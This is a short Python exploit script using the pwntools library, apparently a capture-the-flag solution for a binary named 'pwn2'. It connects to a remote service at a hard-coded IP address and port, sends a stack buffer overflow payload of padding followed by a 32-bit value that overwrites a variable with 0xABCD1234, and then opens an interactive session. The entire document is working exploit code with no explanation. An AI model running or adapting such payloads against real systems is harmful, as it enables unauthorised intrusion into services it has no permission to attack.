from pwn import * 
# p = process("./pwn2")
p = remote("39.107.92.230" , 10002)

target = 0x0ABCD1234
payload = "a" * (0x34 - 0xc) + p32(target)
p.sendline(payload)
p.interactive()